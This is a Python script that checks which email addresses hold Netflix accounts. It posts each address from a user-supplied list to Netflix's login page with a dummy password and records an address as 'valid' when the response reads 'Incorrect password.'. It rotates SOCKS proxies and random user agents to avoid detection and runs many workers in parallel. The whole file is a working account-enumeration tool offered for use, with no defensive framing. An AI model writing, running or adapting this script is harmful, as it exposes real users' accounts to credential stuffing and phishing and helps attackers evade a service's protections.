import requests
from bs4 import BeautifulSoup as Soup
import random
from concurrent.futures import ThreadPoolExecutor
import socks
import socket
import time
from concurrent.futures import ProcessPoolExecutor


def setup_proxy(proxy):
    ip, port = proxy.split(':')
    socks.set_default_proxy(socks.SOCKS4, ip, int(port))
    socket.socket = socks.socksocket


def checker(email, proxies, user_agents):
    retries = 0

    while retries < 100:
        proxy = random.choice(proxies)
        setup_proxy(proxy)
        headers = {"User-Agent": random.choice(user_agents)}

        try:
            client = requests.Session()
            login = client.get("https://www.netflix.com/login", headers=headers, timeout=5)
            soup = Soup(login.text, 'html.parser')
            loginForm = soup.find('form')

            if not loginForm:
                retries += 1
                continue

            authURL = loginForm.find('input', {'name': 'authURL'}).get('value')

            headers.update({
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "accept-encoding": "gzip, deflate, br",
                "referer": "https://www.netflix.com/login",
                "content-type": "application/x-www-form-urlencoded",
            })

            data = {
                "userLoginId": email,
                "password": "ZZabifkar3k",
                "rememberMeCheckbox": "true",
                "flow": "websiteSignUp",
                "mode": "login",
                "action": "loginAction",
                "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                "authURL": authURL,
                "nextPage": "https://www.netflix.com/browse",
                "countryCode": "+1",
                "countryIsoCode": "US"
            }

            request = client.post("https://www.netflix.com/login", headers=headers, data=data, timeout=5)

            if '<b>Incorrect password.</b>' in request.text:
                with open('valids.txt', 'a') as f:
                    f.write(email + '\n')
                    print(f'Valid email: {email}')
                break
            else:
                with open('invalids.txt', 'a') as f:
                    f.write(email + '\n')
                    print(f'Invalid email: {email}')
                break

        except Exception as e:
            retries += 1
            if retries >= 100:
                print(f"Error for email {email}: {str(e)}. Reached maximum retries.")
                break


# Get user input for the email list file path
email_list_path = input("Enter the path to the email list file: ")

# Load emails from file
with open(email_list_path, 'r') as f:
    emails = [line.strip() for line in f.readlines()]

# Load user agents from file
with open('useragents.txt', 'r') as f:
    user_agents = [line.strip() for line in f.readlines()]

# Load proxies from file
with open('pro.txt', 'r') as f:
    proxies = [line.strip() for line in f.readlines()]

# Get user input for the number of threads
num_threads = int(input("Enter the number of threads to use: "))

# Check emails in parallel using ThreadPoolExecutor
with ProcessPoolExecutor(max_workers=num_threads) as executor:
    tasks = [executor.submit(checker, email, proxies, user_agents) for email in emails]

